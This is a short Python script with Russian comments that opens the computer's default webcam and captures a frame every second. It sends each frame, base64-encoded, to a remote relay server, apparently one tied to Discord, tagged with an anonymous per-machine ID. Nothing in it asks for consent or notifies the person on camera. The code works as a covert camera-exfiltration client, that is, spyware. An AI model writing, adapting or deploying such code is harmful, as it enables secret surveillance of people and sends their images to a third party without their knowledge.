import cv2
import base64
import requests
import time
import random
import os

SERVER_URL = "https://discord-relay-production.up.railway.app/upload-cam"  # локально для теста
INTERVAL = 1
PC_ID_FILE = "pc_id.txt"

# Придумываем случайный PC_ID
animals = ['ПК_АНОН_1','ПК_АНОН_2','ПК_АНОН_3','ПК_АНОН_4','ПК_АНОН_5']
if os.path.exists(PC_ID_FILE):
    with open(PC_ID_FILE, "r", encoding="utf-8") as f:
        PC_ID = f.read().strip()
else:
    PC_ID = f"{random.choice(animals)}_{random.randint(0,999999)}"
    with open(PC_ID_FILE,"w",encoding="utf-8") as f:
        f.write(PC_ID)

print(f"PC_ID: {PC_ID}")

# Подключаем камеру
cap = cv2.VideoCapture(0)
if not cap.isOpened(): raise Exception("Не удалось открыть камеру")

def send_frame(frame):
    ret, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY),50])
    if not ret: return
    jpg_base64 = base64.b64encode(buffer).decode('utf-8')
    try:
        requests.post(SERVER_URL, json={"pcId":PC_ID,"screenshot":jpg_base64}, timeout=5)
    except Exception as e:
        print("Ошибка отправки:", e)

try:
    while True:
        ret, frame = cap.read()
        if ret:
            send_frame(frame)
        time.sleep(INTERVAL)
finally:
    cap.release()
